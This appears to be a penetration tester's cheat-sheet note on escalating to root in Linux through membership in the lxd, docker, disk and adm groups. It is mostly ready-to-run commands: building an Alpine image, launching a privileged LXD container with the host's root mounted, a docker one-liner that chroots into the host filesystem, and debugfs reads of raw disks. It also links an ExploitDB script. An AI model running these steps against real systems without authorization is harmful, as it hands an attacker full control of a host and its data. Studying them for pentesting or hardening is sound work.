---
Primary_category: "[[LINUX PRIVESC]]"
title: "LINUX PRIVILEGED GROUPS"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[LINUX PRIVESC]]

#### *Enumeration*

```bash
id
groups "$USER"
```

---

#### *LXC | LXD*

##### *Manual Exploitation*

###### *Downloading the Build Alpine*

> ***From the Attacker*** ⚔️

```bash
curl --silent --location --request GET 'https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine' --remote-name
```

###### *Building Alpine*

> ***From the Attacker*** ⚔️

```bash
bash ./build-alpine
```

###### *Creating the Container*

```bash
lxd init
```

```bash
lxc image import <ALPINE_TAR_GZ> --alias alpine
```

```bash
lxc init alpine privesc -c security.privileged=true
```

```bash
lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
```

```bash
lxc start privesc
```

```bash
lxc exec privesc sh # Or lxc exec privesc /bin/bash
```

##### *ExploitDB*

> ***[ExploitDB](https://www.exploit-db.com/exploits/46978)***

###### *Downloading the Build Alpine*

> ***From the Attacker*** ⚔️

```bash
curl --silent --location --request GET 'https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine' --remote-name
```

###### *Building Alpine*

> ***From the Attacker*** ⚔️

```bash
bash ./build-alpine
```

###### *Running the Exploit*

> ***From the Target*** 🎯

```bash
bash script.bash
```

Once inside the container, just go to **`/mnt/root`** to see all resources from the host machine

---

#### *Docker*

If the current user belongs to the *docker* group, we can spawn new *docker* containers and compromise the entire machine using volumes by mounting the system root **`/`** on the container's **`/mnt`** directory

This is because, by default, both *ROOT* user and the *Docker* group have write permissions over the *Docker Daemon's Socket*

Therefore, a member of the *Docker* group can use the *docker* command *( Docker Client )* to send requests to the *Docker Daemon's API REST* without receiving an access denied error

Alternatively, *Docker* may have *SUID* set or the current user is in the *sudoers* file

In any case, we can create a *Docker Container* with a *bind mount* so that the host's file system is accesible from the container

```bash
docker run --volume /:/mnt --rm --interactive --tty ubuntu chroot /mnt /bin/bash
```

To interact with the *Docker Daemon's Socket*, see ***[[CONTAINERS ABUSE#Docker Sockets|Abusing Docker Sockets]]***

---

#### *Disk*

Members of this group have full access to any existing device within **`/dev`**, which means that file system permissions are ignored, so we can read the entire file system from the raw disk

To do so, we use **`debugfs`**

```bash
debugfs <DISK> # debugfs /dev/sda1
```

---

#### *ADM*

Users belonging to this group can read all logs stored within **`/var/log/`** directory, so an attacker could gather sensitive data stored in log files